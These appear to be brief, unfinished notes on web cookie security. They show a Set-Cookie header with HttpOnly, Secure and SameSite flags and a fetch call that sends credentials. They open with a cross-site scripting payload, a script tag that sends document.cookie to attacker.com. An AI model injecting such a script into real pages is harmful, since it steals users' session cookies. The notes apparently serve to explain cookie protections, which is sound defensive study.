<script>

 fetch('https://attacker.com/steal?cookie=' + document.cookie);

</script>






// airtibe.live
Set-Cookie: jwt=eyJhbGciOi...; HTTPOnly; Secure; SameSite; (SERVER: localhost:3000, CLIENT: localhost:8000)

HTTPOnly --> 


HTTP Request Response Path

```
fetch("/api/user", {

 method: "GET",

 credentials: "include",

});
```